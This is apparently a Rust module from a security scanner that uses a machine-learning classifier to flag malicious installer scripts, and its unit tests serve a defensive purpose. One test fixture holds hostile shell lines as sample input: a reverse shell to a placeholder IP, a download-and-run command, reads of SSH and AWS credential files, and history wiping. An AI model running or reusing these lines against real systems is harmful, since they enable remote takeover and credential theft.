// Machine learning classifier scores installer scripts with a model trained offline in ml/.
// The generated model in ml_model.rs is pure Rust, so inference needs no runtime or network.

use crate::analyzer::{Finding, Severity};
use crate::features;
use crate::ml_model;
use crate::source::{Artifact, InstallerKind};

pub struct Prediction {
    pub probability: f64,
    pub signals: Vec<&'static str>,
}

/// Scores a script artifact. Executables are skipped because the model is trained on scripts.
pub fn predict(artifact: &Artifact) -> Option<Prediction> {
    if matches!(artifact.kind, InstallerKind::Executable) {
        return None;
    }
    let values = features::extract(artifact);
    Some(Prediction {
        probability: probability(&values),
        signals: top_signals(&values, 3),
    })
}

/// Malicious-class probability for a feature vector produced by `features::extract`.
pub fn probability(values: &[f64]) -> f64 {
    ml_model::score(values)[1].clamp(0.0, 1.0)
}

/// Converts a prediction into a finding once it crosses the model's decision threshold.
pub fn finding(prediction: &Prediction) -> Option<Finding> {
    let p = prediction.probability;
    if p < ml_model::THRESHOLD {
        return None;
    }
    let span = (p - ml_model::THRESHOLD) / (1.0 - ml_model::THRESHOLD);
    let (severity, detail) = match p {
        p if p >= 0.9 => (
            Severity::Critical,
            "Classifier is highly confident this script resembles known malicious installers",
        ),
        p if p >= 0.75 => (
            Severity::High,
            "Classifier finds this script closely resembles known malicious installers",
        ),
        _ => (
            Severity::Medium,
            "Classifier finds some resemblance to known malicious installers",
        ),
    };
    let mut evidence = format!("p(malicious) = {p:.2}");
    if !prediction.signals.is_empty() {
        evidence.push_str(&format!("; top signals: {}", prediction.signals.join(", ")));
    }
    Some(Finding {
        source: "ML Model",
        title: "Resembles malicious installer",
        detail,
        severity,
        score: (15.0 + 30.0 * span).round() as u8,
        evidence,
    })
}

/// Active behavioral features ranked by the model's global importance.
fn top_signals(values: &[f64], n: usize) -> Vec<&'static str> {
    let mut active: Vec<(usize, f64)> = ml_model::FEATURE_NAMES
        .iter()
        .enumerate()
        .filter(|(i, name)| values[*i] > 0.0 && features::is_signal(name))
        .map(|(i, _)| (i, ml_model::IMPORTANCES[i]))
        .collect();
    active.sort_by(|a, b| b.1.total_cmp(&a.1));
    active
        .into_iter()
        .take(n)
        .map(|(i, _)| ml_model::FEATURE_NAMES[i])
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use url::Url;

    fn artifact(script: &str, kind: InstallerKind) -> Artifact {
        Artifact {
            bytes: script.as_bytes().to_vec(),
            kind,
            url: Url::parse("https://example.com/install").unwrap(),
        }
    }

    #[test]
    fn model_features_match_extractor() {
        assert_eq!(ml_model::FEATURE_NAMES, features::names().as_slice());
        assert_eq!(ml_model::IMPORTANCES.len(), features::COUNT);
    }

    #[test]
    fn skips_executables() {
        assert!(predict(&artifact("MZ\0\0", InstallerKind::Executable)).is_none());
    }

    #[test]
    fn clean_installer_stays_below_threshold() {
        let script = "#!/usr/bin/env bash\nset -euo pipefail\nusage() { echo 'usage: install.sh'; }\n\
                      url=https://github.com/o/r/releases/download/v1/tool.tar.gz\n\
                      curl -fsSL \"$url\" -o tool.tar.gz\nsha256sum -c tool.sha256\n\
                      tar -xzf tool.tar.gz\ninstall -Dm755 tool \"$HOME/.local/bin/tool\"\n";
        let p = predict(&artifact(script, InstallerKind::Bash)).unwrap();
        assert!(p.probability < ml_model::THRESHOLD, "clean installer scored {}", p.probability);
        assert!(finding(&p).is_none());
    }

    #[test]
    fn dense_indicator_script_is_flagged() {
        let script = "#!/bin/bash\n\
                      echo 'bash -i >& /dev/tcp/192.0.2.13/4444 0>&1'\n\
                      curl http://192.0.2.50/a -o /tmp/a && chmod +x /tmp/a\n\
                      nohup /tmp/a &\ncat ~/.ssh/id_rsa ~/.aws/credentials\n\
                      history -c; unset HISTFILE\nPAYLOAD=aGVsbG8gd29ybGQgdGhpcyBpcyBhIGxvbmcgYmFzZTY0IGJsb2I=\n\
                      echo \"$PAYLOAD\" | base64 --decode\n";
        let p = predict(&artifact(script, InstallerKind::Bash)).unwrap();
        assert!(p.probability >= ml_model::THRESHOLD, "indicator script scored {}", p.probability);
        assert!(finding(&p).is_some());
    }

    #[test]
    fn finding_respects_threshold() {
        let low = Prediction { probability: 0.1, signals: vec![] };
        assert!(finding(&low).is_none());
        let high = Prediction { probability: 0.97, signals: vec!["sh_reverse_shell"] };
        let f = finding(&high).unwrap();
        assert_eq!(f.source, "ML Model");
        assert!(matches!(f.severity, Severity::Critical));
        assert!(f.evidence.contains("sh_reverse_shell"));
    }
}
